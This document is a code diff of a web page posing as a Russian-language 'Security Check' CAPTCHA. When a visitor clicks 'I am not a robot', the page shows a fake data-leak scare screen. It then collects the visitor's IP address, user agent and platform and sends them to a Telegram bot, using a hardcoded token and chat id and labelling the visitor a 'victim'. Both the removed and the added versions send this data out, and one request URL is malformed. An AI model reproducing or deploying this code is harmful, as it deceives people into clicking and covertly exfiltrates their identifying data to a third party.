@@ -4,45 +4,25 @@
     <meta charset="UTF-8">
     <title>Security Check</title>
     <style>
-   
-        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', Courier, monospace; }
-        
- 
-        #captcha-box {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; background: #fff; color: #000;
-        }
-        .btn-verify {
-            padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff;
-            color: white; border: none; border-radius: 5px; margin-top: 20px;
-        }
-
- 
+        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; }
+        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
+        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; }
         #leak-box { display: none; padding: 20px; }
-        .danger-ui { 
-            border: 2px solid red; 
-            padding: 20px; 
-            margin: 50px auto; 
-            max-width: 600px; 
-            background: rgba(255, 0, 0, 0.1);
-        }
-        .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; margin: 0; }
+        .danger-ui { border: 2px solid red; padding: 20px; margin: 50px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
+        .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; }
         hr { border: 0; border-top: 2px solid red; margin: 15px 0; }
-        ul { list-style: square; color: #0f0; }
-        .alert-blink { color: red; font-weight: bold; animation: blink 1s infinite; }
+        .alert-blink { color: red; animation: blink 1s infinite; font-weight: bold; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
- 
     <div id="captcha-box">
         <img src="https://www.gstatic.com" width="80">
-        <h2 style="margin-top: 10px;">Подтвердите, что вы не робот</h2>
+        <h2>Подтвердите, что вы не робот</h2>
         <button class="btn-verify" onclick="startHack()">Я не робот</button>
     </div>
 
-  
     <div id="leak-box">
         <div class="danger-ui">
             <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
@@ -63,38 +43,29 @@
 
     <script>
         async function startHack() {
-     
+           
             document.getElementById('captcha-box').style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
             document.getElementById('user-os').innerText = navigator.platform;
 
-    
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "-1003861311533";
 
-            try {
-      
-                const res = await fetch('https://ipapi.co?format=json');
-                const data = await res.json();
+           
+            const initialMsg = encodeURIComponent(`🔥 ПЕРЕХОД!\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`);
+            fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${initialMsg}`);
+
+            try { 
                 
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
                 document.getElementById('user-ip').innerText = data.ip;
-                document.getElementById('user-geo').innerText = data.city + ", " + data.country_name;
 
-            
-                const log = `🔥 ЖЕРТВА КЛИКНУЛА!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n📱 Устройство: ${navigator.userAgent}`;
-
-               
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat_id, text: log })
-                });
-
+ 
+                const ipMsg = encodeURIComponent(`📍 IP ЖЕРТВЫ: ${data.ip}`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${ipMsg}`);
             } catch (e) {
-                console.log("Лог отправлен без геопозиции.");
-    
-                const backup = `⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`;
-                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
+                document.getElementById('user-ip').innerText = "Ошибка сети";
             }
         }
     </script>
